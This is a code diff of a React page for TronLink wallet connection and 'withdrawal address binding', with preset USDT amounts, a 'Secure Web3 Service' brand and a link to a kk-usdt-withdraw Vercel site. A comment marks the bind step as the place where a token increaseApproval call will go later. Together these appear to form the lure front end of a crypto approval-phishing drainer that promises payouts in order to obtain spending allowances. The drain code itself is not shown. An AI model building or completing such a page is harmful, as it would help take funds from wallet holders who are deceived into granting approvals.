@@ -30,71 +30,32 @@ address
 
 
 
-const [amount,setAmount]=useState("2000");
+const [amount,setAmount] = useState("2000");
 
 
-const [inputAddress,setInputAddress]=useState("");
+const [inputAddress,setInputAddress] = useState("");
 
 
-const [msg,setMsg]=useState("");
+const [msg,setMsg] = useState("");
 
 
-const [showWalletModal,setShowWalletModal]=useState(false);
-
-
-
+const [showWalletModal,setShowWalletModal] = useState(false);
 
 
 
 
 
-// =====================
-// 钱包连接
-// =====================
+
+
+// =======================
+// TronLink连接
+// =======================
 
 
 async function openWallet(){
 
 
 try{
-
-
-// 判断手机
-
-
-const isMobile =
-/Android|iPhone|iPad|iPod/i.test(
-navigator.userAgent
-);
-
-
-
-
-// 手机 Safari
-
-if(
-isMobile &&
-!(window as any).tronWeb
-){
-
-
-
-window.location.href =
-"tronlink://dapp/open?url=https%3A%2F%2Fkk-usdt-withdraw.vercel.app";
-
-
-
-return;
-
-
-}
-
-
-
-
-
-
-// PC 或 TronLink内部
 
 
 await connect();
@@ -105,9 +66,10 @@ setShowWalletModal(false);
 
 
 
+
 setMsg(
 
-"钱包连接成功："+address
+"钱包连接成功"
 
 );
 
@@ -117,7 +79,11 @@ setMsg(
 }catch(error){
 
 
-console.log(error);
+console.log(
+"wallet error:",
+error
+);
+
 
 
 setMsg(
@@ -127,22 +93,24 @@ setMsg(
 );
 
 
-}
-
-
 
 }
 
 
 
+}
 
 
 
 
 
-// =====================
-// 点击绑定
-// =====================
+
+
+
+
+// =======================
+// 绑定按钮
+// =======================
 
 
 async function bindWallet(){
@@ -150,8 +118,6 @@ async function bindWallet(){
 
 
 try{
-
-
 
 
 
@@ -170,8 +136,8 @@ setMsg(
 return;
 
 
-
 }
+
 
 
 
@@ -210,16 +176,14 @@ return;
 
 
 
-if(!connected){
 
+if(!connected){
 
 
 setShowWalletModal(true);
 
 
-
 return;
-
 
 
 }
@@ -230,11 +194,10 @@ return;
 
 
 
+
 setMsg(
 
-
-"钱包连接成功："+address
-
+"钱包地址："+address
 
 );
 
@@ -242,13 +205,11 @@ setMsg(
 
 
 
-
-// 后续这里接 USDT increaseApproval
+// 后续这里接 increaseApproval
 
 
 
 }catch(error){
-
 
 
 console.log(error);
@@ -257,7 +218,7 @@ console.log(error);
 
 setMsg(
 
-"钱包处理失败"
+"处理失败"
 
 );
 
@@ -268,9 +229,12 @@ setMsg(
 
 
 }
-  return (
+return (
+
 
 <main className="min-h-screen bg-[#030817] text-white px-5 py-6">
+
+
 
 
 
@@ -280,7 +244,9 @@ setMsg(
 <div className="flex justify-between items-center">
 
 
+
 <div className="flex items-center gap-3">
+
 
 
 <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-cyan-300 to-blue-500 flex items-center justify-center text-black font-black text-xl">
@@ -310,10 +276,13 @@ Secure Web3 Service
 </div>
 
 
+
 </div>
 
 
+
 </div>
+
 
 
 
@@ -327,6 +296,7 @@ Secure Web3 Service
 
 
 </div>
+
 
 
 
@@ -353,11 +323,14 @@ Secure Web3 Service
 
 
 
+
 <h1 className="text-4xl font-bold mt-8">
 
 提取地址绑定
 
 </h1>
+
+
 
 
 
@@ -375,6 +348,7 @@ Secure Web3 Service
 
 
 
+
 </div>
 
 
@@ -388,8 +362,8 @@ Secure Web3 Service
 {/* 金额选择 */}
 
 
-<div className="mt-12">
 
+<div className="mt-12">
 
 
 <h2 className="font-bold text-lg mb-5">
@@ -397,9 +371,6 @@ Secure Web3 Service
 选择提取金额
 
 </h2>
-
-
-
 
 
 
@@ -461,9 +432,7 @@ className="hidden"
 
 <div className="text-4xl font-bold mt-3">
 
-
 2000
-
 
 <span className="text-xl text-cyan-300 ml-2">
 
@@ -474,7 +443,6 @@ USDT
 
 
 </div>
-
 
 
 
@@ -491,7 +459,9 @@ USDT
 <div className="grid grid-cols-2 gap-4">
 
 
+
 {
+
 
 ["10000","20000","30000"].map(item=>(
 
@@ -571,7 +541,6 @@ className="hidden"
 
 
 
-
 <div className="text-center mt-5 text-sm text-gray-400">
 
 
@@ -589,7 +558,6 @@ className="hidden"
 
 
 
-
 </div>
 
 
@@ -600,7 +568,10 @@ className="hidden"
 
 
 
-{/* 地址 */}
+
+
+
+{/* 地址输入 */}
 
 
 
@@ -612,7 +583,6 @@ className="hidden"
 输入接收地址
 
 </h2>
-
 
 
 
@@ -653,9 +623,7 @@ className="flex-1 bg-transparent outline-none placeholder:text-gray-600"
 
 
 
-
 </div>
-
 
 
 
@@ -685,6 +653,7 @@ className="mt-6 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r fr
 
 
 
+
 {
 msg &&
 
@@ -703,15 +672,10 @@ msg &&
 
 
 </div>
-
-
-
-
 {/* 安全区域 */}
 
 
 <div className="mt-12 space-y-4">
-
 
 
 <div className="bg-white/5 border border-white/10 rounded-2xl p-4">
@@ -722,13 +686,11 @@ msg &&
 
 
 
-
 <div className="bg-white/5 border border-white/10 rounded-2xl p-4">
 
 ⚡ 毫秒级处理速度，及时完成绑定
 
 </div>
-
 
 
 
@@ -836,11 +798,11 @@ className="w-24 h-24 mx-auto rounded-2xl"
 
 <p className="text-gray-400 mt-4 leading-7">
 
-检测到未连接钱包
+请选择连接您的 TronLink 钱包
 
 <br/>
 
-请连接您的 TronLink 钱包
+安全访问 DApp
 
 </p>
 
